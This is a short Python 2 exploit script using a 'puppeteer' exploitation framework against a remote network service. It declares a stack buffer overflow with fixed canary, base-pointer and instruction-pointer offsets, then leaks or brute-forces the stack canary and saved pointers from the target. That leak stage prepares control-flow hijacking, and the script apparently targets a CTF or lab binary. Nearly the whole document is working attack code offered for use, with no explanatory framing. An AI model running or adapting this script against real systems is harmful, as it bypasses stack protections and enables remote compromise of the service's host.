import puppeteer as p

import sys
import logging
#logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
logging.getLogger("puppeteer.manipulator").setLevel(logging.INFO)
#logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)

class Boom(p.Manipulator):
    def __init__(self, host, port):
        p.Manipulator.__init__(self, arch=p.amd64)
        self.c = self.set_connection(host=host, port=port)

    @p.disconnects
    @p.stack_overflow(canary_offset = 1032, bp_offset=1040, ip_offset=1048, nocrash_str='FINE')
    def of(self, buff):
        self.c.send(buff)
        return self.c.recv(4, timeout=2)

def main():
    b = Boom(sys.argv[1], int(sys.argv[2]))

    assert b.of("A"*b.of.puppeteer_flags['canary_offset']) == "FINE"

    #b.determine_canary()
    #b.instance_info['determined_canary'] = b.pack(0x104d5ad5103dfa00)
    #b.instance_info['determined_bp'] = b.pack(0x7fff23d78620)

    print "The canary is:   0x%x" % b.unpack(b.determine_canary())
    print "The saved BP is: 0x%x" % b.unpack(b.determine_saved_bp())
    print "The saved IP is: 0x%x" % b.unpack(b.determine_saved_ip())

main()
